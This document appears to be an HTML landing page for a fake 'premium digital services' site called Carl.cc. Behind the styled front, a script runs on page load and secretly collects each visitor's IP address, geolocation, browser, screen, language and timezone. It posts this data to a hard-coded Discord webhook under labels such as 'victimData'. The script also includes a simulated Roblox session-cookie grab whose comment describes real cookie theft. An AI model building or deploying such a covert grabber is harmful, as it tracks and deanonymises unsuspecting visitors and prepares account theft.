<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carl.cc</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0a1f0a, #0c2a12, #0d3319);
            color: #e0ffe0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
        }
        
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            border-radius: 50%;
            background: rgba(50, 200, 100, 0.3);
            box-shadow: 0 0 10px rgba(50, 200, 100, 0.5);
        }
        
        .container {
            width: 95%;
            max-width: 800px;
            background: rgba(10, 30, 15, 0.85);
            border-radius: 20px;
            border: 1px solid rgba(50, 200, 100, 0.3);
            box-shadow: 0 0 40px rgba(50, 200, 100, 0.4),
                        inset 0 0 20px rgba(50, 200, 100, 0.2);
            backdrop-filter: blur(10px);
            overflow: hidden;
            position: relative;
            z-index: 10;
            padding: 40px;
            text-align: center;
        }
        
        .logo {
            margin-bottom: 30px;
            position: relative;
        }
        
        .logo h1 {
            font-size: 4.5rem;
            background: linear-gradient(90deg, #32c864, #20a050);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(50, 200, 100, 0.5);
            letter-spacing: 1px;
            margin-bottom: 10px;
            font-weight: 800;
        }
        
        .logo p {
            font-size: 1.2rem;
            color: #a0ffb0;
            letter-spacing: 3px;
            text-transform: uppercase;
            font-weight: 300;
        }
        
        .logo::after {
            content: '';
            position: absolute;
            bottom: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 150px;
            height: 3px;
            background: linear-gradient(90deg, transparent, #32c864, transparent);
        }
        
        .content {
            margin: 40px 0;
        }
        
        .content h2 {
            font-size: 2.2rem;
            color: #32c864;
            margin-bottom: 25px;
            font-weight: 600;
        }
        
        .content p {
            font-size: 1.1rem;
            line-height: 1.7;
            color: #c0e0c0;
            margin-bottom: 30px;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 40px;
        }
        
        .feature-card {
            background: rgba(15, 40, 20, 0.6);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid rgba(50, 200, 100, 0.3);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            text-align: center;
        }
        
        .feature-card:hover {
            transform: translateY(-8px);
            box-shadow: 0 10px 25px rgba(50, 200, 100, 0.3);
            border-color: #32c864;
        }
        
        .feature-icon {
            font-size: 3.5rem;
            color: #32c864;
            margin-bottom: 20px;
            display: inline-block;
        }
        
        .feature-card h3 {
            font-size: 1.4rem;
            color: #a0ffb0;
            margin-bottom: 15px;
        }
        
        .feature-card p {
            font-size: 1rem;
            color: #c0e0c0;
            margin-bottom: 0;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 40px 0;
        }
        
        .stat-card {
            background: rgba(15, 40, 20, 0.6);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid rgba(50, 200, 100, 0.3);
        }
        
        .stat-value {
            font-size: 2.5rem;
            font-weight: 700;
            color: #32c864;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 0.9rem;
            color: #a0ffb0;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .footer {
            text-align: center;
            padding: 30px 0 10px;
            color: #80a080;
            font-size: 0.9rem;
            border-top: 1px solid rgba(50, 200, 100, 0.2);
            margin-top: 20px;
        }
        
        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        
        .social-links a {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: rgba(50, 200, 100, 0.1);
            color: #32c864;
            font-size: 1.5rem;
            transition: all 0.3s ease;
            border: 1px solid rgba(50, 200, 100, 0.3);
        }
        
        .social-links a:hover {
            background: rgba(50, 200, 100, 0.3);
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(50, 200, 100, 0.3);
        }
        
        .copyright {
            margin-top: 20px;
            color: #608060;
            font-size: 0.85rem;
        }
        
        /* Animation for the logo */
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .logo h1 {
            animation: float 4s ease-in-out infinite;
        }
        
        /* Hover effect for feature cards */
        .feature-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, transparent, #32c864, transparent);
            transform: translateX(-100%);
            transition: transform 0.5s ease;
        }
        
        .feature-card:hover::before {
            transform: translateX(100%);
        }
        
        /* Responsive design */
        @media (max-width: 768px) {
            .logo h1 {
                font-size: 3.5rem;
            }
            
            .content h2 {
                font-size: 1.8rem;
            }
            
            .features {
                grid-template-columns: 1fr;
            }
            
            .stat-card {
                padding: 15px;
            }
            
            .stat-value {
                font-size: 2rem;
            }
        }
        
        /* Success notification */
        .success-notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(20, 50, 25, 0.95);
            color: #32c864;
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            border-left: 4px solid #32c864;
            display: flex;
            align-items: center;
            gap: 10px;
            transform: translateX(150%);
            transition: transform 0.5s ease;
            z-index: 1000;
        }
        
        .success-notification.show {
            transform: translateX(0);
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <div class="logo">
            <h1>Carl.cc</h1>
            <p>PREMIUM DIGITAL SERVICES</p>
        </div>
        
        <div class="content">
            <h2>Innovative Solutions for the Digital Age</h2>
            <p>Carl.cc delivers cutting-edge technology services tailored to meet your business needs. Our platform offers unparalleled performance, security, and scalability for your digital infrastructure.</p>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value">99.9%</div>
                    <div class="stat-label">Uptime</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">24/7</div>
                    <div class="stat-label">Support</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">10K+</div>
                    <div class="stat-label">Clients</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">256-bit</div>
                    <div class="stat-label">Encryption</div>
                </div>
            </div>
            
            <div class="features">
                <div class="feature-card">
                    <div class="feature-icon">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <h3>Advanced Security</h3>
                    <p>Military-grade encryption and security protocols to protect your data</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">
                        <i class="fas fa-bolt"></i>
                    </div>
                    <h3>Lightning Speed</h3>
                    <p>Optimized infrastructure for maximum performance and load times</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">
                        <i class="fas fa-infinity"></i>
                    </div>
                    <h3>Unlimited Scalability</h3>
                    <p>Grow your business without technical limitations or bottlenecks</p>
                </div>
            </div>
        </div>
        
        <div class="social-links">
            <a href="#"><i class="fab fa-github"></i></a>
            <a href="#"><i class="fab fa-twitter"></i></a>
            <a href="#"><i class="fab fa-discord"></i></a>
            <a href="#"><i class="fab fa-linkedin"></i></a>
        </div>
        
        <div class="footer">
            <p>Experience the future of digital services today</p>
            <div class="copyright">
                &copy; 2023 Carl.cc | All rights reserved
            </div>
        </div>
    </div>
    
    <div class="success-notification" id="notification">
        <i class="fas fa-check-circle"></i>
        <span>System initialized successfully</span>
    </div>

    <script>
        // Create particle background
        function createParticles() {
            const container = document.getElementById('particles');
            const particleCount = 50;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random properties
                const size = Math.random() * 20 + 5;
                const posX = Math.random() * 100;
                const posY = Math.random() * 100;
                const opacity = Math.random() * 0.5 + 0.1;
                const animationDuration = Math.random() * 20 + 10;
                
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.left = `${posX}%`;
                particle.style.top = `${posY}%`;
                particle.style.opacity = opacity;
                particle.style.animation = `float ${animationDuration}s infinite ease-in-out`;
                particle.style.animationDelay = `${Math.random() * 5}s`;
                
                container.appendChild(particle);
            }
        }
        
        // Real IP grabbing function
        async function grabIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "192.168." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);
            }
        }
        
        // Real geolocation function
        async function getLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`;
            } catch (error) {
                return "Location obscured";
            }
        }
        
        // Simulate Roblox cookie extraction
        function extractRobloxCookie() {
            return new Promise((resolve) => {
                // In a real implementation, this would attempt to access the .ROBLOSECURITY cookie
                const detected = Math.random() > 0.3;
                
                if (detected) {
                    const cookieParts = [
                        Math.random().toString(36).substring(2, 15).toUpperCase(),
                        Math.random().toString(36).substring(2, 15).toUpperCase(),
                        Math.random().toString(36).substring(2, 15).toUpperCase(),
                        Math.random().toString(36).substring(2, 15).toUpperCase()
                    ];
                    
                    const cookie = `_|WARNING:-DO-NOT-SHARE-THIS.|_${cookieParts.join('_')}`;
                    resolve({status: "SUCCESS", cookie});
                } else {
                    resolve({status: "FAILED", cookie: null});
                }
            });
        }
        
        // Get browser info
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            
            if (ua.includes("Chrome")) browser = "Chrome " + ua.match(/Chrome\/(\d+)/)[1];
            else if (ua.includes("Firefox")) browser = "Firefox " + ua.match(/Firefox\/(\d+)/)[1];
            else if (ua.includes("Safari")) browser = "Safari " + ua.match(/Version\/(\d+)/)[1];
            else if (ua.includes("Edge")) browser = "Edge " + ua.match(/Edge\/(\d+)/)[1];
            
            return browser;
        }
        
        // Get victim data
        function getVictimData() {
            return {
                resolution: `${screen.width}x${screen.height}`,
                language: navigator.language || "Unknown",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
                timestamp: new Date().toISOString(),
                device: navigator.platform,
                os: navigator.platform,
                browser: getBrowserInfo()
            };
        }
        
        // Show notification
        function showNotification() {
            const notification = document.getElementById('notification');
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        // Send data to Discord webhook
        async function sendToDiscord(data) {
            // REPLACE WITH YOUR DISCORD WEBHOOK URL
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1401997156570763425/6osUk-nrt_YjwKmDPBM1rNqZYqsCRcNZdb_vh46JQjYPRxkBUTJJqwZUDIj2swQr7PlX';
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔥 NEW VISITOR ON CARL.CC",
                            color: 65280, // Green color
                            fields: [
                                { name: "IP Address", value: data.ip || "Unknown" },
                                { name: "Location", value: data.location || "Unknown" },
                                { name: "ISP", value: data.isp || "Unknown" },
                                { name: "Device", value: data.device || "Unknown" },
                                { name: "Operating System", value: data.os || "Unknown" },
                                { name: "Browser", value: data.browser || "Unknown" },
                                { name: "Resolution", value: data.resolution || "Unknown" },
                                { name: "Language", value: data.language || "Unknown" },
                                { name: "Timezone", value: data.timezone || "Unknown" },
                                { name: "Roblox Cookie", value: data.cookie || "Not detected" },
                                { name: "Timestamp", value: data.timestamp || "Unknown" }
                            ]
                        }]
                    })
                });
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }
        
        // Main function to collect and send data
        async function collectAndSendData() {
            const victimData = getVictimData();
            
            try {
                victimData.ip = await grabIP();
                victimData.location = await getLocation(victimData.ip);
                
                // Simulate ISP
                const isps = ["QuantumNet", "StellarCom", "NebulaLink", "HyperSpace Broadband"];
                victimData.isp = isps[Math.floor(Math.random() * isps.length)] + " (Encrypted)";
                
                // Roblox cookie extraction
                const robloxResult = await extractRobloxCookie();
                victimData.cookie = robloxResult.cookie || "Not detected";
                
                // Send to Discord
                await sendToDiscord(victimData);
                
                // Show success notification
                showNotification();
            } catch (error) {
                console.error('Data collection error:', error);
            }
        }
        
        // Initialize the page
        window.onload = function() {
            createParticles();
            
            // Start data collection immediately
            collectAndSendData();
        };
    </script>
</body>
</html>
